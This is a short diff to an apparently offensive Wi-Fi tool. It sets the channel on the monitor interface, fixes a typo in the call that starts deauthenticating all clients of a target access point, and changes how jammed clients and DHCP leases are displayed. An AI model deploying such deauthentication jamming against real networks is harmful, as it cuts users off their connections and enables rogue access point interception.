@@ -854,10 +854,13 @@ def run():
 
     if not args.nojamming:
         monchannel = channel
+        # set the channel on the deauthenticating interface
+        mon_iface.set_channel(int(channel))
+
         # start deauthenticating all client on target access point
         deauthentication = deauth.Deauthentication(ap_mac,
                                                    mon_iface.get_name())
-        deauthentication.deauthentiate()
+        deauthentication.deauthenticate()
 
     # Main loop.
     try:
@@ -875,7 +878,7 @@ def run():
                     print term.move(1, 0) + term.blue("Jamming the following clients: ")
                     if deauthentication.get_clients():
                         for client in deauthentication.get_clients():
-                            print "[" + T + "*" + W + "] " + O + client + W
+                            print client
                     print term.move(9,0) + term.blue("DHCP Leases: ")
                     if os.path.isfile('/var/lib/misc/dnsmasq.leases'):
                         proc = check_output(['tail', '-5', '/var/lib/misc/dnsmasq.leases'])
